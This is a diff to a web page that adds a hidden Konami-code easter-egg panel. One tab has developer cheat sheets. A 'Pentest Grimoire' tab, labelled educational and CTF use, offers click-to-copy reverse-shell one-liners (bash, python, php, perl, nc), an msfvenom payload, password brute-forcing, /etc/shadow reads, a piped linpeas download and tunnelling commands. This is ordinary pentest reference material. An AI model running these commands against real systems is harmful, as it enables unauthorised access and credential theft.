@@ -385,10 +385,276 @@
 
     <!-- KONAMI CODE EXPLOSION -->
     <div id="konami-explosion">
-        <div id="konami-title">GIACOMO PROTOCOL ACTIVATED</div>
-        <div id="konami-sub">YOU HAVE UNLOCKED THE VOID</div>
         <canvas id="konami-canvas"></canvas>
-        <button id="konami-close-btn">RETURN FROM THE VOID</button>
+
+        <div id="konami-inner">
+            <!-- Header -->
+            <div id="konami-header">
+                <div id="konami-title">GIACOMO PROTOCOL ACTIVATED</div>
+                <div id="konami-sub">⚡ YOU HAVE UNLOCKED THE VOID ⚡</div>
+                <div id="konami-access-badge">🔓 ACCESS LEVEL: ROOT</div>
+            </div>
+
+            <!-- Tab nav -->
+            <div id="void-tabs">
+                <button class="void-tab active" data-tab="tech">🛠 TECH ARSENAL</button>
+                <button class="void-tab" data-tab="pentest">💀 PENTEST GRIMOIRE</button>
+            </div>
+
+            <!-- ═══════════════════════════════════
+                 TAB: TECH ARSENAL
+            ════════════════════════════════════ -->
+            <div id="void-tab-tech" class="void-tab-content active">
+
+                <!-- System info live -->
+                <div class="void-sysinfo">
+                    <div class="sysinfo-row"><span class="sinfo-label">USER AGENT</span><span class="sinfo-val" id="si-ua">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">PLATFORM</span><span class="sinfo-val" id="si-plat">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">CORES</span><span class="sinfo-val" id="si-cores">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">MEMORY</span><span class="sinfo-val" id="si-mem">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">SCREEN</span><span class="sinfo-val" id="si-screen">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">ONLINE</span><span class="sinfo-val" id="si-online">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">LANG</span><span class="sinfo-val" id="si-lang">—</span></div>
+                    <div class="sysinfo-row"><span class="sinfo-label">TIMEZONE</span><span class="sinfo-val" id="si-tz">—</span></div>
+                </div>
+
+                <!-- Tech tool cards -->
+                <div class="void-tools-grid">
+
+                    <div class="void-tool-card">
+                        <div class="vtc-icon">🌐</div>
+                        <div class="vtc-title">HTTP Status Codes</div>
+                        <div class="vtc-body">
+                            <div class="vtc-tags">
+                                <span class="vtg green">200 OK</span>
+                                <span class="vtg green">201 Created</span>
+                                <span class="vtg green">204 No Content</span>
+                                <span class="vtg blue">301 Moved</span>
+                                <span class="vtg blue">304 Not Modified</span>
+                                <span class="vtg orange">400 Bad Request</span>
+                                <span class="vtg orange">401 Unauthorized</span>
+                                <span class="vtg orange">403 Forbidden</span>
+                                <span class="vtg orange">404 Not Found</span>
+                                <span class="vtg orange">429 Rate Limit</span>
+                                <span class="vtg red">500 Server Error</span>
+                                <span class="vtg red">502 Bad Gateway</span>
+                                <span class="vtg red">503 Unavailable</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card">
+                        <div class="vtc-icon">🔑</div>
+                        <div class="vtc-title">Regex Cheatsheet</div>
+                        <div class="vtc-body">
+                            <div class="regex-list">
+                                <div class="rx-row"><code>^</code><span>Start of string</span></div>
+                                <div class="rx-row"><code>$</code><span>End of string</span></div>
+                                <div class="rx-row"><code>.</code><span>Any char except newline</span></div>
+                                <div class="rx-row"><code>\d</code><span>Digit [0-9]</span></div>
+                                <div class="rx-row"><code>\w</code><span>Word char [a-zA-Z0-9_]</span></div>
+                                <div class="rx-row"><code>\s</code><span>Whitespace</span></div>
+                                <div class="rx-row"><code>*</code><span>0 or more</span></div>
+                                <div class="rx-row"><code>+</code><span>1 or more</span></div>
+                                <div class="rx-row"><code>?</code><span>0 or 1</span></div>
+                                <div class="rx-row"><code>{n,m}</code><span>Between n and m</span></div>
+                                <div class="rx-row"><code>[abc]</code><span>Character set</span></div>
+                                <div class="rx-row"><code>(x|y)</code><span>Alternation</span></div>
+                                <div class="rx-row"><code>(?=...)</code><span>Positive lookahead</span></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card">
+                        <div class="vtc-icon">⌨️</div>
+                        <div class="vtc-title">Git Essentials</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="git clone &lt;url&gt;">git clone &lt;url&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git status">git status</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git add -A && git commit -m 'msg'">git add -A &amp;&amp; git commit -m 'msg'</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git push origin main">git push origin main</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git log --oneline --graph --all">git log --oneline --graph --all</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git stash && git stash pop">git stash &amp;&amp; git stash pop</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git reset --hard HEAD~1">git reset --hard HEAD~1</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="git rebase -i HEAD~3">git rebase -i HEAD~3</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card">
+                        <div class="vtc-icon">🐳</div>
+                        <div class="vtc-title">Docker Commands</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker ps -a">docker ps -a</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker images">docker images</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker pull &lt;image&gt;">docker pull &lt;image&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker run -it --rm &lt;image&gt; /bin/bash">docker run -it --rm &lt;image&gt; /bin/bash</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker build -t name:tag .">docker build -t name:tag .</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker compose up -d">docker compose up -d</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker exec -it &lt;id&gt; bash">docker exec -it &lt;id&gt; bash</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="docker system prune -af">docker system prune -af</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card">
+                        <div class="vtc-icon">🐧</div>
+                        <div class="vtc-title">Linux Must-Know</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="ls -lah">ls -lah</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="find / -name '*.conf' 2>/dev/null">find / -name '*.conf' 2&gt;/dev/null</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="ps aux | grep &lt;process&gt;">ps aux | grep &lt;process&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="netstat -tulpn">netstat -tulpn</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="chmod +x script.sh && ./script.sh">chmod +x script.sh &amp;&amp; ./script.sh</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="curl -s https://api.example.com | jq .">curl -s https://api.example.com | jq .</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="tail -f /var/log/syslog">tail -f /var/log/syslog</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="grep -rn 'pattern' /path/">grep -rn 'pattern' /path/</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card">
+                        <div class="vtc-icon">🔢</div>
+                        <div class="vtc-title">Number Converter</div>
+                        <div class="vtc-body">
+                            <div class="converter-row">
+                                <input type="number" id="conv-input" class="conv-input" placeholder="Enter a number…" min="0">
+                            </div>
+                            <div class="conv-results">
+                                <div class="conv-item"><span class="conv-label">DEC</span><span class="conv-val" id="conv-dec">—</span></div>
+                                <div class="conv-item"><span class="conv-label">HEX</span><span class="conv-val" id="conv-hex">—</span></div>
+                                <div class="conv-item"><span class="conv-label">OCT</span><span class="conv-val" id="conv-oct">—</span></div>
+                                <div class="conv-item"><span class="conv-label">BIN</span><span class="conv-val" id="conv-bin">—</span></div>
+                                <div class="conv-item"><span class="conv-label">ASCII</span><span class="conv-val" id="conv-ascii">—</span></div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- ═══════════════════════════════════
+                 TAB: PENTEST GRIMOIRE
+            ════════════════════════════════════ -->
+            <div id="void-tab-pentest" class="void-tab-content">
+
+                <div class="pentest-warning">⚠️ FOR EDUCATIONAL &amp; CTF PURPOSES ONLY. USE RESPONSIBLY. ⚠️</div>
+
+                <div class="void-tools-grid">
+
+                    <div class="void-tool-card pentest-card">
+                        <div class="vtc-icon">🔍</div>
+                        <div class="vtc-title vtc-red">Reconnaissance</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="nmap -sC -sV -oN scan.txt &lt;target&gt;">nmap -sC -sV -oN scan.txt &lt;target&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="nmap -p- --min-rate 5000 &lt;target&gt;">nmap -p- --min-rate 5000 &lt;target&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="nmap -sU -top-ports 200 &lt;target&gt;">nmap -sU --top-ports 200 &lt;target&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="whatweb &lt;url&gt;">whatweb &lt;url&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="whois &lt;domain&gt;">whois &lt;domain&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="dig ANY &lt;domain&gt; @8.8.8.8">dig ANY &lt;domain&gt; @8.8.8.8</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="theHarvester -d &lt;domain&gt; -b all">theHarvester -d &lt;domain&gt; -b all</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="subfinder -d &lt;domain&gt; | httpx">subfinder -d &lt;domain&gt; | httpx</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card pentest-card">
+                        <div class="vtc-icon">🌐</div>
+                        <div class="vtc-title vtc-red">Web Enumeration</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="gobuster dir -u &lt;url&gt; -w /usr/share/wordlists/dirb/common.txt">gobuster dir -u &lt;url&gt; -w common.txt</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="ffuf -u &lt;url&gt;/FUZZ -w wordlist.txt -mc 200,301,302">ffuf -u &lt;url&gt;/FUZZ -w wordlist.txt -mc 200,301</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="nikto -h &lt;url&gt;">nikto -h &lt;url&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="wpscan --url &lt;url&gt; --enumerate p,u">wpscan --url &lt;url&gt; --enumerate p,u</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="sqlmap -u '&lt;url&gt;?id=1' --dbs --batch">sqlmap -u '&lt;url&gt;?id=1' --dbs --batch</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="curl -I &lt;url&gt;">curl -I &lt;url&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="nuclei -u &lt;url&gt; -t cves/">nuclei -u &lt;url&gt; -t cves/</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card pentest-card">
+                        <div class="vtc-icon">💥</div>
+                        <div class="vtc-title vtc-red">Exploitation</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="msfconsole">msfconsole</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="searchsploit &lt;service&gt; &lt;version&gt;">searchsploit &lt;service&gt; &lt;version&gt;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f exe -o shell.exe">msfvenom -p win/x64/shell_reverse_tcp LHOST=IP -f exe</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="python3 -m http.server 8080">python3 -m http.server 8080</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="nc -lvnp 4444">nc -lvnp 4444</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="hydra -l admin -P rockyou.txt &lt;target&gt; http-get /admin">hydra -l admin -P rockyou.txt &lt;target&gt; http-get</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="john --wordlist=rockyou.txt hash.txt">john --wordlist=rockyou.txt hash.txt</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="hashcat -m 0 hash.txt rockyou.txt">hashcat -m 0 hash.txt rockyou.txt</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card pentest-card">
+                        <div class="vtc-icon">🐚</div>
+                        <div class="vtc-title vtc-red">Reverse Shells</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="bash -i >& /dev/tcp/&lt;ip&gt;/4444 0>&1">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/4444 0&gt;&amp;1</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"&lt;ip&gt;\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'">python3 reverse shell one-liner</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="php -r '$sock=fsockopen(\"&lt;ip&gt;\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'">php -r reverse shell</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="perl -e 'use Socket;$i=\"&lt;ip&gt;\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'">perl reverse shell one-liner</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="nc -e /bin/sh &lt;ip&gt; 4444">nc -e /bin/sh &lt;ip&gt; 4444</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="rlwrap nc -lvnp 4444">rlwrap nc -lvnp 4444</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'">TTY spawn: python3 -c pty.spawn</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card pentest-card">
+                        <div class="vtc-icon">🏔️</div>
+                        <div class="vtc-title vtc-red">Privilege Escalation</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="sudo -l">sudo -l</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="find / -perm -4000 -type f 2>/dev/null">find / -perm -4000 -type f 2&gt;/dev/null (SUID)</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="cat /etc/passwd && cat /etc/shadow">cat /etc/passwd &amp;&amp; cat /etc/shadow</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="crontab -l && cat /etc/crontab">crontab -l &amp;&amp; cat /etc/crontab</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="uname -a && cat /etc/os-release">uname -a &amp;&amp; cat /etc/os-release</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash">linpeas.sh (from GitHub)</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe">winPEAS download</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card pentest-card">
+                        <div class="vtc-icon">🧅</div>
+                        <div class="vtc-title vtc-red">Network &amp; Pivoting</div>
+                        <div class="vtc-body cmd-list">
+                            <div class="cmd-item void-copy-cmd" data-cmd="tcpdump -i eth0 -w capture.pcap">tcpdump -i eth0 -w capture.pcap</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="wireshark &">wireshark &amp;</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="ssh -L 8080:localhost:80 user@target">SSH local port forward</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="ssh -D 1080 user@target">SSH SOCKS5 proxy</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="chisel server -p 8000 --reverse">chisel server (reverse tunnel)</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="chisel client &lt;server&gt;:8000 R:4444:127.0.0.1:4444">chisel client (forward port)</div>
+                            <div class="cmd-item void-copy-cmd" data-cmd="proxychains4 nmap -sT &lt;target&gt;">proxychains4 nmap -sT &lt;target&gt;</div>
+                        </div>
+                    </div>
+
+                    <div class="void-tool-card pentest-card vtc-wide">
+                        <div class="vtc-icon">🧠</div>
+                        <div class="vtc-title vtc-red">OSINT Toolkit</div>
+                        <div class="vtc-body">
+                            <div class="osint-links">
+                                <a class="osint-link" href="https://www.shodan.io" target="_blank" rel="noopener">🔭 Shodan</a>
+                                <a class="osint-link" href="https://www.exploit-db.com" target="_blank" rel="noopener">💥 Exploit-DB</a>
+                                <a class="osint-link" href="https://cve.mitre.org" target="_blank" rel="noopener">📋 CVE Mitre</a>
+                                <a class="osint-link" href="https://gtfobins.github.io" target="_blank" rel="noopener">🦅 GTFOBins</a>
+                                <a class="osint-link" href="https://lolbas-project.github.io" target="_blank" rel="noopener">🪟 LOLBAS</a>
+                                <a class="osint-link" href="https://book.hacktricks.xyz" target="_blank" rel="noopener">📖 HackTricks</a>
+                                <a class="osint-link" href="https://revshells.com" target="_blank" rel="noopener">🐚 RevShells</a>
+                                <a class="osint-link" href="https://crackstation.net" target="_blank" rel="noopener">🔓 CrackStation</a>
+                                <a class="osint-link" href="https://cyberchef.io" target="_blank" rel="noopener">🍳 CyberChef</a>
+                                <a class="osint-link" href="https://www.virustotal.com" target="_blank" rel="noopener">🛡 VirusTotal</a>
+                                <a class="osint-link" href="https://search.censys.io" target="_blank" rel="noopener">🌍 Censys</a>
+                                <a class="osint-link" href="https://hunter.io" target="_blank" rel="noopener">📧 Hunter.io</a>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- Footer / close -->
+            <div id="konami-footer">
+                <div id="void-copy-toast">✅ Copied to clipboard!</div>
+                <button id="konami-close-btn">⬅ RETURN FROM THE VOID</button>
+            </div>
+        </div>
     </div>
 
     <script src="script.js"></script>
